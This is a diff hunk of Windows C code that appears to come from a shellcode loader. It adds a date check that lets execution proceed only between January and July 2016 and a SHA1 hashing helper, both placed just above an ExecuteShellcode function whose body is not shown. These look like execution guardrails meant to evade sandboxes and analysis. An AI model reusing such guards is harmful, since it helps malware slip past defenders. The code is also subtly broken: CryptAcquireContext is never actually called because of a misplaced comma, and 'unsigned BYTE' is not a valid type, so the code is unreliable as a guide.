@@ -82,7 +82,73 @@ unsigned int MutexCheck(const char *name) {
 //////////////////////////////////////////////////////////////////////////////////
 unsigned int DateTimeCheck() {
 
+	SYSTEMTIME ct;
+	GetSystemTime(&ct);
+
+	// Check that we are between January and July 2016
+	if ((ct.wYear == 2016 && ct.wMonth <= 7) && (ct.wYear == 2016 && ct.wMonth >= 1)) {
+		return TRUE;
+	} else {
+		return FALSE;
+	}
+
 }
+
+
+
+//////////////////////////////////////////////////////////////////////////////////
+//
+//   GenerateHash()
+//   Returns a pointer to a buffer containing a SHA1 hash or FALSE if there is a problem
+//
+//////////////////////////////////////////////////////////////////////////////////
+HGLOBAL GenerateHash(unsigned BYTE *src, unsigned int len) {
+	
+	HCRYPTPROV hProv;
+	HCRYPTHASH hHash;
+	DWORD hash_size_needed;
+	DWORD hash_size_needed_len;
+	HGLOBAL hash_value;
+	HGLOBAL ret = { 0 };
+
+	// Acquire a handle to the general key container
+	if (CryptAcquireContext, &hProv, NULL, NULL, PROV_RSA_AES, NULL) {
+
+		// Generate a handle to the SHA1 hash type that we want
+		if (CryptCreateHash(hProv, CALG_SHA1, NULL, NULL, &hHash)) {
+
+			// Hash the data
+			if (CryptHashData(hHash, src, len, NULL)) {
+
+				// We know it is SHA-1 and therefore 160-bit but I left this in to make it
+				// easier and more resilient to changes in hash algorithm choice etc. Therefore,
+				// request the hash size from the CryptoAPI
+				hash_size_needed_len = 4;
+				if (CryptGetHashParam(hHash, HP_HASHSIZE, &hash_size_needed, &hash_size_needed_len)) {
+
+					// Now allocate memory for the hash
+					if (hash_value = GlobalAlloc(GPTR, hash_size_needed)) {
+
+						if (CryptGetHashParam(hHash, HP_HASHVAL, hash_value, &hash_size_needed, NULL)) {
+							ret = hash_value;
+						}
+
+					}
+				}
+
+			}
+
+			// Clean up
+			CryptDestroyHash(hHash);
+		}
+
+		// Clean up
+		CryptReleaseContext(hProv, NULL);
+	} 
+	return (HGLOBAL) ret;
+}
+
+
 
 void ExecuteShellcode() {
 
